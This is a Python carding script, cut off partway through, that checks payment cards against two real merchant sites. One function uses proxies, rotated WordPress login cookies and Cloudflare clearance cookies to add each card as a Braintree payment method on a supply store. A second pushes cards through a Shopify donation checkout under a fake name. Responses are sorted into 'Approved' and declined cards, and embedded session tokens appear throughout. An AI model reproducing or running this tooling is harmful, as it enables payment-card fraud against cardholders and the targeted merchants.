import requests
import re
import user_agent
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def notauto(ccx):
  proxy = get_proxy()
  print(proxy)
  from user_agent import generate_user_agent
  user = user_agent.generate_user_agent()
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    last_used_times = {}
  while True:
    lines = '''aman44%40gmail.com%7C1744896112%7CSlBqEAxO6exEeroL3K05xOuEOOhoiC6hDDYXkRDtms9%7Cf98472d66230417354f2481b3e5571249ed6e66edabcfce6aadfab0b824637b5
amay2u2i29992n44%40gmail.com%7C1744896630%7C5pDUB2jidT153JmrBDCzh5Eag0rUBJMtXfCsWVtlQBT%7C5fe8d807f092388898f545ce62f385202640f40be03d1b97882b802a91317a48
ambdjdkwkkean44%40gmail.com%7C1744900543%7CTIaFuphDuekIpOJSG6rhG84oCBCaZwKtalNYSt77Hiq%7C137b18564710f0eea1533acf4672aef54652403daa1998bac8c6dbbcf45d656b
ajejejyejwj2jman44%40gmail.com%7C1744900692%7Cf2t5MJjOiedj2k4PndwjIZ08OGYF0CxEeoCjD3usBBV%7C660103b8d9c387434c8e4a79893ff3947d2d086fbab44ab23e26560c59715bb4
a929292hman44%40gmail.com%7C1744950871%7CRZv14Vh6WYezkvDtV4hi9HFB6cICI9I3xAS8tDJOauB%7Cb76fe969f33b37e177b0b35e0de89c67ddac36ffb4f87771db8418a51fb5b946
aman4ysyeu2844%40gmail.com%7C1744951014%7CXwqvW1OLGw1qtBJ06kWorxO3ShN7BLubLF4G9LPFBSC%7Cbdb676c5f62e1272b736561e38910b34a21d82ce20da6c4ee50916738d114a71
aman4euiei34%40gmail.com%7C1744951143%7CU4PVbdD5Llaz9ML3pHdWmGfffXxBWjCxWrbA7lcJ2rI%7C867c61ce909f8ebfdd45c73c2aa76d6f6b31acf2d4524da80f1f3d56b264efae
ayeu372727man44%40gmail.com%7C1744951290%7CNX6DeTzDD9f10coS9GefFu5eIZKQmkcKwBF0Di4m7rX%7C7364894de11652c6ceff526caf020db2b14aaf79e54235292449f840ab6ce7ae
amty722an44%40gmail.com%7C1744951397%7C0Bftm7d3idI6dK8Tel4g8pdSFxuJ2p2dFpOFJYtO4JK%7C43f9a789e7611ecfab79f5f36aa61ecb6a2a34c03a2a26b5a1e321fcf071222e
amany2y272u44%40gmail.com%7C1744951507%7CZP6sZ7Fqcd7f05QMBpQfy8SXFln70vAyDwKHotI64ys%7Ccf1ec290f4c8f2846b5f16b8b305c3584a35e4585a845d3ba387fca8fac0ff77
ama55tt2ghjuiwn44%40gmail.com%7C1744951750%7C8bdaZ82y3OTvjJmRhQpnrC7YfUq5PP0pXF2ucXptHcM%7C09b094887f700df3a4579e447a1b232ee93888d7bdd1f92a8e483893965d52af'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
    	time_since_last_use = current_time - last_used_times[big]
    	if time_since_last_use < 10:
    		continue    
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
    'sbjs_session': 'pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fpayment-methods%2F',
}

  headers = {
    'authority': 'glasshousesupply.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://glasshousesupply.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

  response = requests.get('https://glasshousesupply.com/my-account/add-payment-method/', cookies=cookies, headers=headers, proxies=proxy)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)
  response = requests.get("https://ipinfo.io/json", proxies=proxy)
  print(response.text)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6c244cd1-8fc1-4764-872a-779df4d8a7ac',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'Near Walmart 45',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': big,
    'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100705%7Cother%7Cread%7C754ebfb787cbaeaea34079c370e1f2ead5643e9f5386e3d0c50484feb4e5bbb0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-03-16%2011%3A44%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cf_clearance': 'CCAg4uwlxO.Qqur8ew8BJHbSG0uI.h0Hq6JUJ.Mjq8U-1742127267-1.2.1.1-uZDEiW70g.oAsyttj6XTD1yyTI.wajTRLCw6lwCdChwHR9ihc7PLsH6I5J2kch.HnTgSnML4CCm0acGePaglKKML2.mshBGbKTlQOA.BJKZLxNAWusXSlb09MIRLaWgteeFkQXNDNUB_AU9RKM44lqL9pD7Ckrl6vcCwnJXt7ELL2SGOeixJzUE.o2xypZbNLtcprpJSPk1B3ANJkjpCvAqSxNXyMHHwO51_ciXU_SDB1mOjLER5SHfOz2L36YnUpnIZ7p8v6ZCfhPlS2Qcpv.Xe1Blj8.ZGKneFU8OR05n9hOMk1Q25X2WaXdX96rxjfXIon18xWXyK82CeqTK1lE5qcS05wd1pS86t0qlu3fQ',
    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
}

  headers = {
    'authority': 'glasshousesupply.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://glasshousesupply.com',
    'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"d93c0f351e441c91b6b49ab9d2f2a871","fraud_merchant_id":null,"correlation_id":"1cd6de08-ac9f-4dac-9738-f846dca6"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/gsnpd3rfchdqjpkp/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/gsnpd3rfchdqjpkp"},"merchantId":"gsnpd3rfchdqjpkp","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Glass House Supply","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDIyMTM5NzIsImp0aSI6IjljMzNiNDAwLTc2MmMtNDczMC1hZGMzLTdhM2IzZmIzNDNjZCIsInN1YiI6ImdzbnBkM3JmY2hkcWpwa3AiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImdzbnBkM3JmY2hkcWpwa3AiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.IEjz_pe5iVfQyQxVm5maCb5-cxxVKE3FupqBPCHsz88-x9g2753sUNniEE4S0wPBIzca-qAOgCaJ48SjvOjN5g","paypalClientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4016730080957399375","accessToken":"access_token$production$gsnpd3rfchdqjpkp$28454b24bcf28cb102a779aa4289345a","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Glass House Supply","clientId":"AUbS02x4orTIJOuTTxAgXN87eUn7l8n0LtbH5UvfAmU44swb4BUJ_Qk65pGcHV6vfV23jGEJ9aL5Q-ln","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"glasshousesupply_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

  response = requests.post(
    'https://glasshousesupply.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
    proxies=proxy
)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = 'wait for 20 seconds'
    else:
      result = "Declined"
      print('er#')
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
  else:
     return result
import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {'authority': 'wiredministries.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW','origin': 'https://wiredministries.com','referer': 'https://wiredministries.com/products/donate','sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1', 'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',}
	data = '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="utf8"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="add"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
	response = r.post('https://wiredministries.com/cart/add', cookies=r.cookies, headers=headers, data=data)
	headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://wiredministries.com', 'priority': 'u=0, i','referer': 'https://wiredministries.com/cart','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	data = {'updates[]': '2', 'note': '', 'checkout': 'Check out'}
	response = r.post('https://wiredministries.com/cart', headers=headers, data=data)
	headers = {'accept': 'application/json','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-type': 'application/json','origin': 'https://checkout.shopifycs.com','priority': 'u=1, i','referer': 'https://checkout.shopifycs.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
	json_data = {'credit_card': {'number': n,'month': mm,'year': yy,'verification_value': cvc,'name': 'Tome Annder',},'payment_session_scope': 'wiredministries.com',}
	iddd = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data).json()['id']
	headers = {'accept': 'application/json','accept-language': 'en-US','content-type': 'application/json','origin': 'https://wiredministries.com','priority': 'u=1, i','referer': 'https://wiredministries.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','x-checkout-one-session-token': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09','x-checkout-web-build-id': iddd,'x-checkout-web-deploy-stage': 'production','x-checkout-web-server-handling': 'fast','x-checkout-web-server-rendering': 'no','x-checkout-web-source-id': 'Z2NwLWV1cm9wZS13ZXN0MTowMUo2NVlXVlhRQVI0QUtOWEM4VlBaTTJIWQ',}
	params = {'operationName': 'PollForReceipt',}
	
	json_data = {'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on 